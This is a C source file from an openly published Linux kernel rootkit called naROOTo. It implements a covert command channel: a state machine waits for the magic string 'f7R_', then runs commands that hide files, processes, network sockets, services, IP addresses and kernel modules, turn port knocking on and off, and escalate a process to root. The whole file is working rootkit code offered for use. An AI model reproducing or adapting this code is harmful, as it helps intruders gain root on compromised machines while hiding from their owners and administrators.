/******************************************************************************
 *
 * Name: covert_communication.c 
 * All functionality needed for the covert communication channel.
 *
 *****************************************************************************/
/*
 * This file is part of naROOTo.

 * naROOTo is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.

 * naROOTo is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.

 * You should have received a copy of the GNU General Public License
 * along with naROOTo.  If not, see <http://www.gnu.org/licenses/>. 
 */

#include <linux/inet.h>
 
#include "control.h"
#include "covert_communication.h"
#include "include.h"
#include "hide_module.h"
#include "privilege_escalation.h"
#include "read.h"

static int state = 0;
static int cstate = 0;
static char *magic_cookie = "f7R_";

static char command_buffer[32];
static int command_counter = 0;

static char param_buffer[1024];
static int param_counter = 0;

void
execute_command (void)
{
	int port;
	pid_t pid;
	__u32 ipaddr;
	
	u8 tmp[4];

	int ret = -EINVAL;

	if(strcmp(command_buffer, "hide_file") == 0) {
		if(param_counter > 0)
			ret = hide_file_path(param_buffer);
	} else if(strcmp(command_buffer, "unhide_file") == 0) {
		if(param_counter > 0)
			ret = unhide_file_path(param_buffer);
	} else if(strcmp(command_buffer, "hide_fprefix") == 0) {
		if(param_counter > 0)
			ret = hide_file_prefix(param_buffer);
	} else if(strcmp(command_buffer, "unhide_fprefix") == 0) {
		if(param_counter > 0)
			ret = unhide_file_prefix(param_buffer);
	} else if(strcmp(command_buffer, "hide_process") == 0) {
		if(param_counter > 0) {
			pid = convert_atoi(param_buffer);
			ret = hide_process(pid);	
		}
	} else if(strcmp(command_buffer, "unhide_process") == 0) {
		if(param_counter > 0) {
			pid = convert_atoi(param_buffer);
			ret = unhide_process(pid);	
		}
	} else if(strcmp(command_buffer, "hide_tcp") == 0) {
		if(param_counter > 0) {
			port = convert_atoi(param_buffer);
			ret = hide_tcp_socket(port);
		}
	} else if(strcmp(command_buffer, "unhide_tcp") == 0) {
		if(param_counter > 0) {
			port = convert_atoi(param_buffer);
			ret = unhide_tcp_socket(port);
		}
	} else if(strcmp(command_buffer, "hide_udp") == 0) {
		if(param_counter > 0) {
			port = convert_atoi(param_buffer);
			ret = hide_udp_socket(port);
		}
	} else if(strcmp(command_buffer, "unhide_udp") == 0) {
		if(param_counter > 0) {
			port = convert_atoi(param_buffer);
			ret = unhide_udp_socket(port);
		}
	} else if(strcmp(command_buffer, "enable_knocking_tcp") == 0) {
		if(param_counter > 0) {
			port = convert_atoi(param_buffer);
			ret = enable_knocking_tcp(port);
		}
	} else if(strcmp(command_buffer, "disable_knocking_tcp") == 0) {
		if(param_counter > 0) {
			port = convert_atoi(param_buffer);
			ret = disable_knocking_tcp(port);
		}
	} else if(strcmp(command_buffer, "enable_knocking_udp") == 0) {
		if(param_counter > 0) {
			port = convert_atoi(param_buffer);
			ret = enable_knocking_udp(port);
		}
	} else if(strcmp(command_buffer, "disable_knocking_udp") == 0) {
		if(param_counter > 0) {
			port = convert_atoi(param_buffer);
			ret = disable_knocking_udp(port);
		}
	} else if(strcmp(command_buffer, "hide_service") == 0) {
		if(param_counter > 0) {
			port = convert_atoi(param_buffer);
			ret = hide_service(port);
		}
	} else if(strcmp(command_buffer, "unhide_service") == 0) {
		if(param_counter > 0) {
			port = convert_atoi(param_buffer);
			ret = unhide_service(port);
		}
	} else if(strcmp(command_buffer, "hide_ip") == 0) {
		if(param_counter > 0) {
			/* convert ip string to an int array */
			if(in4_pton(param_buffer, -1, tmp, -1, NULL) == 0)
				ROOTKIT_DEBUG("[func 'hide_ip'] Not a valid IP address!\n");

			/* hack to convert byte array to __u32 */
			ipaddr = 0;
			ipaddr |= tmp[0] & 0xFF;
			ipaddr <<= 8;
			ipaddr |= tmp[1] & 0xFF;
			ipaddr <<= 8;
			ipaddr |= tmp[2] & 0xFF;
			ipaddr <<= 8;
			ipaddr |= tmp[3] & 0xFF;

			ret = hide_ip_address(ipaddr);
		}
	} else if(strcmp(command_buffer, "unhide_ip") == 0) {
		if(param_counter > 0) {
			/* convert ip string to an int array */
			if(in4_pton(param_buffer, -1, tmp, -1, NULL) == 0)
				ROOTKIT_DEBUG("[func 'unhide_ip'] Not a valid IP address!\n");

			/* hack to convert byte array to __u32 */
			ipaddr = 0;
			ipaddr |= tmp[0] & 0xFF;
			ipaddr <<= 8;
			ipaddr |= tmp[1] & 0xFF;
			ipaddr <<= 8;
			ipaddr |= tmp[2] & 0xFF;
			ipaddr <<= 8;
			ipaddr |= tmp[3] & 0xFF;

			ret = unhide_ip_address(ipaddr);
		}
	} else if(strcmp(command_buffer, "hide_module") == 0) {
		if(param_counter > 0)
			ret = hide_module_byname(param_buffer);
	} else if(strcmp(command_buffer, "unhide_module") == 0) {
		if(param_counter > 0)
			ret = unhide_module_byname(param_buffer);
	} else if(strcmp(command_buffer, "escalate") == 0) {
		ret = priv_escalation();
		ROOTKIT_DEBUG("rooted\n");
	} else if(strcmp(command_buffer, "deescalate") == 0) {
		ret = priv_deescalation();
		ROOTKIT_DEBUG("un-rooted\n");
	} else if(strcmp(command_buffer, "enable_filelog") == 0) {
                ret = enable_filelog();
                ROOTKIT_DEBUG("Local file logging enabled\n");
        } else if(strcmp(command_buffer, "disable_filelog") == 0) {
                ret = disable_filelog();
                ROOTKIT_DEBUG("Local file logging disabled\n");
	} else 
		ret = -ENOSYS;

	if(ret < 0)
		ROOTKIT_DEBUG("command '%s %s' failed with error code %i",
			command_buffer, param_buffer, ret);
        
	/* cleanup */
	memset(command_buffer, 0, 32);
	command_counter = 0;
	
	memset(param_buffer, 0 , 1024);
	param_counter = 0;

	state = 0;
}

void
accept_command_input (char input)
{
	if(command_counter >= 0 && command_counter < 32) {
		if(input == ' ') {		/* continue with parameter */
			command_buffer[command_counter] = '\0';
			state = 2;
		} else if(input == ';') {	/* terminate command */
			command_buffer[command_counter] = '\0';
			state = 2;
			execute_command();
		} else if(input == 127) {	/* backspace */
			if(command_counter > 0) {
				memset(command_buffer + command_counter, 0, 1);
				command_counter--;
			}
		} else {
			command_buffer[command_counter] = input;
			command_counter++;
		}

	} else {
		memset(command_buffer, 0, 32);
		command_counter = 0;

		state = 0;
	} 
}

void accept_param_input (char input)
{
	if(param_counter >= 0 && param_counter < 1024) {
		if(input == ';') {		/* terminate the parameter */
			param_buffer[param_counter] = '\0';
			execute_command();	
		} else if(input == '\'') {	/* useful for aborting input */
			memset(command_buffer, 0, 32);
			command_counter = 0;

			memset(param_buffer, 0, 1024);
			param_counter = 0;

			state = 0;		
		} else if(input == 127) {	/* backspace */
			if(command_counter > 0) {
				memset(param_buffer + param_counter, 0, 1);
				param_counter--;
			}
		} else {
			param_buffer[param_counter] = input;
			param_counter++;
		}
	} else {
		memset(command_buffer, 0, 32);
		command_counter = 0;
		
		memset(param_buffer, 0, 1024);
		param_counter = 0;

		state = 0;
	}
}

/* the main state-machine accepting our inputs */
int
accept_input (char input)
{
	if(!control_loaded())
		return -EPERM;

	if(state == 0) {
		
		if(magic_cookie[cstate] == input) {
			cstate++;
		} else {
			cstate = 0;
		}

		if(cstate >= 4) {
			cstate = 0;
			state = 1;
		}

	} else if(state == 1) {
		accept_command_input(input);
	} else if(state == 2) {
		accept_param_input(input);
	}
	
	return 0;
}
